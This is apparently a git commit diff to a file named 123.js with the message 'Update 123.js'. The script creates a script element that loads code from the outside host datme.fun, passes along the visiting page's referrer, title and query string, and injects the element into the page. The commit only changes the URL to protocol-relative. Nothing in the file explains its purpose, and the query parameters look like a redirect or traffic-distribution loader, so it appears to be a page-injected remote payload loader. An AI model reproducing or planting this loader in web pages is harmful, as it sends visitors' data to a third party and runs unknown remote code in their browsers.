cab44d140f61f78c5a7762f4f6085a3e936a1dfc
JOLLYhit <72670377+JOLLYhit@users.noreply.github.com>
2020-10-12 01:06:14 +0300

    Update 123.js

--- 123.js
+++ 123.js
@@ -1,5 +1,6 @@
+
 var d=document;var s=d.createElement('script'); 
-s.src='http://datme.fun/fHkywC?frm=script&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+''; 
+s.src='//datme.fun/fHkywC?frm=script&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+''; 
 if (document.currentScript) { 
 document.currentScript.parentNode.insertBefore(s, document.currentScript);
 } else {
